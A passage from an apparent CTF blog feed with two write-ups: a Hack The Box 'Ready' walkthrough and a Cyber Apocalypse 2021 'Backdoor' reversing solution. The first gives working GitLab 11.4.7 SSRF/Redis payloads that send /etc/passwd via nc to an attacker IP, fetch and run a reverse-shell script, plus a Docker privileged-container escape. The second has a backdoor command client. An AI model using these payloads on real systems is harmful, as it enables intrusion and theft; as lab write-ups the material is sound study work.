+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;3072&lt;/span&gt; 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+5080/tcp open  http    nginx
+| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; disallowed entries &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; shown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| / /autocomplete/users /search /api /admin /profile
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help
+|_/s/ /snippets/new /snippets/*/edit
+| http-title: Sign in &lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;C2&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;B7 GitLab
+|_Requested resource was http://10.129.90.66:5080/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 20.31 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;NMAP shows that port 22 is open for SSH and there is a GitLab instance running a web server on port 5080. A sign in page is accessible that allows new accounts to be created.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-gitlabsignup.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;With a newly created account it is possible to check for any public projects or users to find more information in this box. However, in this instance there isn&amp;rsquo;t anything and the instance appears blank.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-gitlabhelppage.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;It is possible to access a help page which, among other things, lists the current version, 11.4.7 and the notice to &amp;ldquo;Update asap&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;Research on GitLab 11.4.7 there is a well know RCE through an Server Side Request Forgery, a type of vulnerability, where an an attacker can change a URL which the server will attempt to read or submit data too. In this case, it allows us to interact with an internal redis database service and start a malicious worker package.  This vulnerability was was featured in Real World CTF 2018 and LiveOverflow created a &lt;a href=&#34;https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;video and blog post&lt;/a&gt;
+ detailing it.&lt;/p&gt;
+&lt;p&gt;It is possible to follow along with the blog post to create a proof of concept allowing  &lt;code&gt;/etc/passwd&lt;/code&gt; to be read.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{\&amp;#34;class\&amp;#34;:\&amp;#34;GitlabShellWorker\&amp;#34;,\&amp;#34;args\&amp;#34;:[\&amp;#34;class_eval\&amp;#34;,\&amp;#34;open(\&amp;#39;|cat /etc/passwd | nc 10.10.14.142 1234\&amp;#39;).read\&amp;#34;],\&amp;#34;retry\&amp;#34;:3,\&amp;#34;queue\&amp;#34;:\&amp;#34;system_hook_push\&amp;#34;,\&amp;#34;jid\&amp;#34;:\&amp;#34;ad52abc5641173e217eb2e52\&amp;#34;,\&amp;#34;created_at\&amp;#34;:1513714403.8122594,\&amp;#34;enqueued_at\&amp;#34;:1513714403.8129568}&amp;#34;&lt;/span&gt;
+ exec
+ exec
+/ssrf.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This payload is URL encoded and then &lt;code&gt;git://[0:0:0:0:0:ffff:127.0.0.1]:6379/&lt;/code&gt; is added to the front to bypass the check filter to block requests to localhost on the GitLab server. The next step is to create a new project and chose to import a git repo by URL.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-importproject.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Provide our URL encoded payload, set up a netcat listener on port 1234, and then submitting the payload, returns the contents of &lt;code&gt;/etc/password&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git://&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0:0:0:0:0:ffff:127.0.0.1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:6379/%0A%20multi%0A%20sadd%20resque:gitlab:queues%20system_hook_push%0A%20lpush%20resque:gitlab:queue:system_hook_push%20%22%7B%5C%22class%5C%22:%5C%22GitlabShellWorker%5C%22,%5C%22args%5C%22:%5B%5C%22class_eval%5C%22,%5C%22open&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%5C&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%7Ccat%20/etc/passwd%20%7C%20nc%2010.10.14.142%201234%5C&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.read%5C%22%5D,%5C%22retry%5C%22:3,%5C%22queue%5C%22:%5C%22system_hook_push%5C%22,%5C%22jid%5C%22:%5C%22ad52abc5641173e217eb2e52%5C%22,%5C%22created_at%5C%22:1513714403.8122594,%5C%22enqueued_at%5C%22:1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A/ssrf.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-etcpasswdfromimport.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;Obtaining a reverse shell proved to be a bit tricky. Executing one reverse shell directly from called back but then terminated immediately. Instead, a shell can be obtained in few additional steps. Create a bash reverse shell in a script and start a python http server. Then use two SSRF requests. The first one downloads the revershell using wget. The second one executes it.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Get script.sh&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{\&amp;#34;class\&amp;#34;:\&amp;#34;GitlabShellWorker\&amp;#34;,\&amp;#34;args\&amp;#34;:[\&amp;#34;class_eval\&amp;#34;,\&amp;#34;open(\&amp;#39;| wget http://10.10.14.142/script.sh \&amp;#39;).read\&amp;#34;],\&amp;#34;retry\&amp;#34;:3,\&amp;#34;queue\&amp;#34;:\&amp;#34;system_hook_push\&amp;#34;,\&amp;#34;jid\&amp;#34;:\&amp;#34;ad52abc5641173e217eb2e52\&amp;#34;,\&amp;#34;created_at\&amp;#34;:1513714403.8122594,\&amp;#34;enqueued_at\&amp;#34;:1513714403.8129568}&amp;#34;&lt;/span&gt;
+ exec
+ exec
+/ssrf.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Execute script.sh&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{\&amp;#34;class\&amp;#34;:\&amp;#34;GitlabShellWorker\&amp;#34;,\&amp;#34;args\&amp;#34;:[\&amp;#34;class_eval\&amp;#34;,\&amp;#34;open(\&amp;#39;| bash script.sh \&amp;#39;).read\&amp;#34;],\&amp;#34;retry\&amp;#34;:3,\&amp;#34;queue\&amp;#34;:\&amp;#34;system_hook_push\&amp;#34;,\&amp;#34;jid\&amp;#34;:\&amp;#34;ad52abc5641173e217eb2e52\&amp;#34;,\&amp;#34;created_at\&amp;#34;:1513714403.8122594,\&amp;#34;enqueued_at\&amp;#34;:1513714403.8129568}&amp;#34;&lt;/span&gt;
+ exec
+ exec
+/ssrf.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-shellhuzzah.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;user&#34;&gt;User&lt;/h2&gt;
+&lt;p&gt;Very first thing to do, especially since this was a pain, is to upgrade are shell so we have more options and are less likely to crash it.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git@gitlab:~/gitlab-rails/working$ python3 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+&amp;lt;orking$ python3 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+git@gitlab:~/gitlab-rails/working$ ^Z
+zsh: suspended  nc -lnvp &lt;span style=&#34;color:#ae81ff&#34;&gt;1234&lt;/span&gt;
+
+┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nightwolf㉿archlinux&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/HTB/Ready&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ stty -a | head -n1 | cut -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt; -f 2-3 | cut -b2- | sed &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/; /\n/&amp;#39;&lt;/span&gt;                                                                                          &lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt; ⨯ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ⚙
+rows &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;
+columns &lt;span style=&#34;color:#ae81ff&#34;&gt;170&lt;/span&gt;
+
+┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nightwolf㉿archlinux&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/HTB/Ready&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ stty raw -echo; fg                                                                                                                                                &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ⚙
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  + continued  nc -lnvp &lt;span style=&#34;color:#ae81ff&#34;&gt;1234&lt;/span&gt;
+                               stty rows &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; cols &lt;span style=&#34;color:#ae81ff&#34;&gt;170&lt;/span&gt;
+git@gitlab:~/gitlab-rails/working$ export TERM&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;xterm-256color
+git@gitlab:~/gitlab-rails/working$ exec /bin/bash
+git@gitlab:~/gitlab-rails/working$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The user can be found in &lt;code&gt;/home/dude/user.txt&lt;/code&gt; but the current user of &lt;code&gt;gitlab&lt;/code&gt; is unable to read the file itself. &lt;code&gt;gitlab&lt;/code&gt; doesn&amp;rsquo;t have any interesting groups or files that stand out in it&amp;rsquo;s  home folder. There don&amp;rsquo;t have any passwords to try with suds or su. Expanding the search, for config files that might contain credentials or other interesting info,  &lt;code&gt;.dockerenv&lt;/code&gt; is found. This  is a file in the root of the file system, letting us know that the current shell is inside a docker container.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-inthematrix.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;In the the &lt;code&gt;/opt&lt;/code&gt; directory there is a folder titled &amp;ldquo;backup&amp;rdquo; inside are various configuration files for GitLab and a docker compose file that looks to have been the same one that may have been used to start this container.&lt;/p&gt;
+&lt;p&gt;Another file present in the same folder is &lt;code&gt;gitlab.rb&lt;/code&gt; a configuration file for GItLab. There is a lot of data to sift through inside it. Grep can be used to to filter out some more useful info. For example the following can be used to find references to &amp;ldquo;password &amp;ldquo;&lt;code&gt;grep -R &amp;quot;password&amp;quot; ./&lt;/code&gt;  and reveals, &lt;code&gt;wW59U!ZKMbG9+*#h&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-backupdirpassword.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;This password is not valid for &lt;code&gt;dude&lt;/code&gt; but does allow  &lt;code&gt;su&lt;/code&gt; to &lt;code&gt;root&lt;/code&gt; user inside the container. User.txt is also accessible.&lt;/p&gt;
+&lt;h2 id=&#34;root&#34;&gt;Root&lt;/h2&gt;
+&lt;p&gt;Docker is a platform that makes use of Linux namespaces to provide an isolated environment called a container. They can seem similar to virtual machines but are different on a technical level. If you want to read some more about that you can check out the &lt;a href=&#34;https://docs.docker.com/get-started/overview/#the-underlying-technology&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;documentation&lt;/a&gt;
+&lt;/p&gt;
+&lt;p&gt;The docker compose file found before showed the container was likely started with the &lt;code&gt;--privileged&lt;/code&gt; flag, not something. The &lt;code&gt;--privileged&lt;/code&gt; flag launches the container with extended privileges that can be abused.&lt;/p&gt;
+&lt;p&gt;From the documentation, &amp;ldquo;By default, Docker containers are “unprivileged” and cannot, for example, run a Docker daemon inside a Docker container. This is because by default a container is not allowed to access any devices, but a “privileged” container is given access to all devices (see the documentation on &lt;a href=&#34;https://www.kernel.org/doc/Documentation/cgroup-v1/devices.txt&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;cgroups devices&lt;/a&gt;
+).&lt;/p&gt;
+&lt;p&gt;When the operator executes &lt;code&gt;docker run --privileged&lt;/code&gt;, Docker will enable access to all devices on the host as well as set some configuration in AppArmor or SELinux to allow the container nearly all the same access to the host as processes running outside containers on the host. Additional information about running with &lt;code&gt;--privileged&lt;/code&gt; is available on the &lt;a href=&#34;http://blog.docker.com/2013/09/docker-can-now-run-within-docker/&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Docker Blog&lt;/a&gt;
+.&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;This is going to enable escape from the container and gain root on the host in two very simple commands. First make a directory and then simply mount sda2 in that directory.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mkdir -p /mnt/hola
+mount /dev/sda2 /mnt/hola
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the the file system from of the host system is accessible the container.  &lt;code&gt;/mnt/hola/root&lt;/code&gt; contains the root flag.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-mountoutsidefilesystem.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;It is possible to obtain a root shell on the host system itself through several methods. One of which is retrive the root ssh key from, &lt;code&gt;/mnt/hola/root/.ssh/id_rsa&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-caniintrestyouinashell.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ready-indeedyoucan.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;wrap-up&#34;&gt;Wrap up&lt;/h2&gt;
+&lt;p&gt;Huge thanks to &lt;a href=&#34;https://app.hackthebox.eu/users/27897&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;bertolis&lt;/a&gt;
+ for creating this machine.  I did see several comments talking about how it was very similar to another machine that was active at the time but it still felt unique to me, especially after foothold. A docker escape was also pretty fun and I&amp;rsquo;d like to learn more advanced ways to do that in the future.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Cyber Apocalypse 2021: Backdoor</title>
+      <link>http://nightwolf56.github.io/ctf-writeups/ca-backdoor/</link>
+      <pubDate>Sun, 25 Apr 2021 00:00:00 -0200</pubDate>
+      
+      <guid>http://nightwolf56.github.io/ctf-writeups/ca-backdoor/</guid>
+      <description>&lt;p&gt;&lt;em&gt;Note: I did not solve this challenge until after the CTF had officially ended.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;File shows that bd, is a stripped binary which can make reversing a bit harder.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ file bd
+bd: ELF 64-bit LSB shared object, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;1da3a1d77c7109ce6444919f4a15e7e6c63d02fa, stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nothing relevant shows up in strings though it&amp;rsquo;s interesting to note the size of the binary.&lt;/p&gt;
+&lt;p&gt;Once opened in Ghidra, an interesting section can be seen in the program tree.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-backdoor-pydata.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Pydata is a section that indicates this binary is actually a &amp;ldquo;frozen&amp;rdquo; python script that has been packaged with all needed dependencies inside an ELF file. This makes it fairly portable and also accounts for the size of the binary.&lt;/p&gt;
+&lt;p&gt;The next step is to extract the python from this executable. After that, it should be readable like any other python script. First, objcopy is used to extract pydata.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nightwolf@archlinux ~/CTF/cyber-apocalypse/ % objcopy --dump-section pydata&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pydat.out bd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This can then be feed to &lt;code&gt;pydecipher&lt;/code&gt; to decompress the actual python code.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nightwolf@archlinux ~/CTF/cyber-apocalypse/ % ~/.local/bin/pydecipher -d -v bd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;An output folder is created that contains all the decompressed data.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-backdoor-pythoncode.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;The majority of this is dependencies &lt;code&gt;db.py&lt;/code&gt; is is the most interesting. It contains an simple socket implementation that listens for connections providing the md5 sum of a specific string and then executing commands that follow.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-backdoor-dbpy.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Note: the local version of the script as show isn&amp;rsquo;t quiet right. All the strings need to be typed as bytes but weren&amp;rsquo;t by the extractor.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;With this info, a script can be created that opens a connection with the remote target, sends &lt;code&gt;s4v3_th3_w0rld&lt;/code&gt;, and then executes commands to retrieve the flag.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python3&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; readline
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; hashlib &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; md5
+
+server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;
+port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4433&lt;/span&gt;
+password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;s4v3_th3_w0rld&amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; True:
+    command &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;#34;&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; command &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;exit&amp;#34;&lt;/span&gt;:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Exiting...&amp;#34;&lt;/span&gt;)
+        exit()
+    data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ( &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; command:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; command)
+    s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
+    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((server, port))
+    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendall((md5(password)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; command:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; data)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
+    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&amp;rsquo;s important to remember the server will only receive 32 bytes of data. Anything sent beyond that will be cut off and likely cause an error.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Cyber Apocalypse 2021: Backdoor</title>
+      <link>http://nightwolf56.github.io/posts/ca-backdoor/</link>
+      <pubDate>Sun, 25 Apr 2021 00:00:00 -0200</pubDate>
+      
+      <guid>http://nightwolf56.github.io/posts/ca-backdoor/</guid>
+      <description>&lt;p&gt;&lt;em&gt;Note: I did not solve this challenge until after the CTF had officially ended.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;File shows that bd, is a stripped binary which can make reversing a bit harder.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ file bd
+bd: ELF 64-bit LSB shared object, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;1da3a1d77c7109ce6444919f4a15e7e6c63d02fa, stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nothing relevant shows up in strings though it&amp;rsquo;s interesting to note the size of the binary.&lt;/p&gt;
+&lt;p&gt;Once opened in Ghidra, an interesting section can be seen in the program tree.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-backdoor-pydata.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Pydata is a section that indicates this binary is actually a &amp;ldquo;frozen&amp;rdquo; python script that has been packaged with all needed dependencies inside an ELF file. This makes it fairly portable and also accounts for the size of the binary.&lt;/p&gt;
+&lt;p&gt;The next step is to extract the python from this executable. After that, it should be readable like any other python script. First, objcopy is used to extract pydata.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nightwolf@archlinux ~/CTF/cyber-apocalypse/ % objcopy --dump-section pydata&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pydat.out bd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This can then be feed to &lt;code&gt;pydecipher&lt;/code&gt; to decompress the actual python code.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nightwolf@archlinux ~/CTF/cyber-apocalypse/ % ~/.local/bin/pydecipher -d -v bd
